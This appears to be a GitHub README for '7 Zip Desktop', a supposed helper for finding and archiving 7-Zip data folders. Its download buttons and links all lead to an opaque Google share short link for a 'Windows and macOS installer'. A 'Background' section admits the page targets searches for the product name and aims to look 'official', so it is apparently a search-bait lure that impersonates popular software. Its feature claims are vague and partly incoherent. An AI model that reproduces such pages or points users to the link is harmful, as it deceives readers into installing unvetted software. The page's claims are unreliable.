![7 Zip Desktop](assets/hero.png)

# 7 Zip Desktop

*Find the 7 Zip folder fast and keep a local spare.*

## What 7 Zip Desktop is

**7 Zip Desktop** runs on your own PC. Local Windows and macOS helper for 7 Zip data paths, config and export caches, and export folders.

Patches move 7 Zip data paths without warning.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Locates 7 Zip user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for 7 Zip is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/kathleenr-811/7-zip-desktop

MIT license. See `LICENSE`.
